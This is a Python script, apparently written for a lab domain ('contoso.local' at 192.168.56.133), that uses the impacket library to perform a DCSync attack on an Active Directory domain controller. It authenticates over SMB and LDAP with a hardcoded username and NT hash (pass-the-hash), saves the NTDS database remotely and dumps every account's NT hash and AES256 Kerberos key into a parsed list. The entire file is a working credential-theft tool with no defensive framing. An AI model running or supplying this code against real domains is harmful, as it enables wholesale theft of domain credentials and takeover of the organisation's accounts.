from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
from impacket.smbconnection import SMBConnection
from impacket.ldap.ldap import LDAPConnection, LDAPSessionError
from impacket.dcerpc.v5.rpcrt import DCERPCException
import io
from contextlib import redirect_stdout
import sys

def get_domain_base(domain):
    domain_base = ''
    split_domain = domain.split('.')
    for dom_slice in split_domain:
        domain_base = domain_base + f'dc={dom_slice},'

    domain_base = domain_base[:-1]
    return domain_base

def dcsync(target, username, domain, password='', nthash=''):
    try:
        smb_conn = SMBConnection(target, target)
    except:
        print("Host unreachable.", file=sys.stderr)
        return None
    try:
        smb_conn.login(user=username, password=password, nthash=nthash, domain=domain)
    except:
        print("Invalid credentials provided.", file=sys.stderr)
        return None

    base_dn = get_domain_base(domain)

    try:
        ldapConnection = LDAPConnection(f'ldap://{target}', base_dn, target)
    except LDAPSessionError as e:
        if str(e).find('strongerAuthRequired') >= 0: # Trying ssl
            ldapConnection = LDAPConnection(f'ldaps://{target}', base_dn, target)
        else:
            print("LDAP connection error.", file=sys.stderr)
            return None
        
    # Login can't fail if it succeded with smb
    ldapConnection.login(user=username, password=password, domain=domain, nthash=nthash)

    remote_ops = RemoteOperations(smb_conn, False, target, ldapConnection)
    try:
        remote_ops.enableRegistry()
        boot_key = remote_ops.getBootKey()
        ntds_filename = remote_ops.saveNTDS()
    except DCERPCException as e:
        if str(e).find('rpc_s_access_denied') >= 0:
            print("The current user doesn't have enough rights.", file=sys.stderr)
            try:
                remote_ops.finish()
            except:
                print("Problem with cleanup.", file=sys.stderr)
            return None
        else:
            print("Error when retrieving required information via RPC.", file=sys.stderr)
            return None


    ntds = NTDSHashes(ntds_filename, boot_key, isRemote=True, remoteOps=remote_ops, justNTLM=False)

    # Capture function stdout for parsing
    f = io.StringIO()
    with redirect_stdout(f):
        try:
            ntds.dump()
        except Exception as e:
            if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                print("The current user doesn't have DCSync rights.", file=sys.stderr)
                return None
            else:
                print("Error while performing DCSync.", file=sys.stderr)
                return None
    dcsync_out = parse_output(f.getvalue())

    # Cleanup
    try:
        remote_ops.finish()
        ntds.finish()
    except:
        print("Problem with cleanup.", file=sys.stderr)

    return dcsync_out

def parse_output(ntds_dump):
    dcsync_out = []
    entries = ntds_dump.split("\n")
    for entry in entries:
        split_list = entry.split(':')
        if len(split_list) == 7:
            user_data = {}
            user_data['username'] = split_list[0]
            user_data['rid'] = split_list[1]
            user_data['nt_hash'] = split_list[3]
            dcsync_out.append(user_data)
        elif len(split_list) == 3 and split_list[1] == 'aes256-cts-hmac-sha1-96': # Kerberos key will always come after ntlm hashes
            username = split_list[0]
            for user_dict in dcsync_out:
                if user_dict['username'] == username:
                    user_dict['aes256_key'] = split_list[2]
    return dcsync_out


dcsync_out = dcsync(target="192.168.56.133", username="d.garza", nthash="5a642013439f0ab8721115d3a87068db", domain="contoso.local") # Can perform DCSync
#dcsync_out = dcsync(target="192.168.56.133", username="l.douglas", nthash="e3162fc537e66f4dc1287271cdbec59b", domain="contoso.local") # Cannot perform DCSync

# Output is a list of dict in the following format:
# [{'username':'l.douglas', 'rid':'1652', 'nthash':'e3162fc537e66f4dc1287271cdbec59b', 'aes_256':'5db0df75e081189715afe6c7bd14436e6a068365a212244a7f904e1178b8b310'}]
#for entry in dcsync_out:
#    print(entry)